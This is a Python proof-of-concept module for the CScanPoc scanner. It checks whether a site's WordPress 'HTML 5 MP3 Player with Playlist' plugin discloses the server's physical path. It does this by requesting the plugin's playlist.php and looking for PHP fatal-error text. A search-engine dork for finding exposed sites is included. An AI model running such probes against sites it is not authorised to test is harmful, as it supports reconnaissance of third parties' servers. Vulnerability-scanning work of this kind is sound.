# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'WordPress_0017' # 平台漏洞编号，留空
    name = 'WordPress HTML 5 MP3 Player with Playlist 插件泄漏服务器物理路径' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2014-11-27'  # 漏洞公布时间
    desc = '''
        DORK: inurl:html5plus/html5full.php
    ''' # 漏洞描述
    ref = '' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress HTML 5 MP3 Player with Playlist 插件'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1f146d01-4e76-43b5-9110-2aa07390c66d'
    author = '国光'  # POC编写者
    create_date = '2018-05-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            file_path = '/wp-content/plugins/html5-mp3-player-with-playlist/html5plus/playlist.php' 
            verify_url = '{target}'.format(target=self.target)+file_path
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if '<b>Fatal error</b>:' in content and '</b> on line <b>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()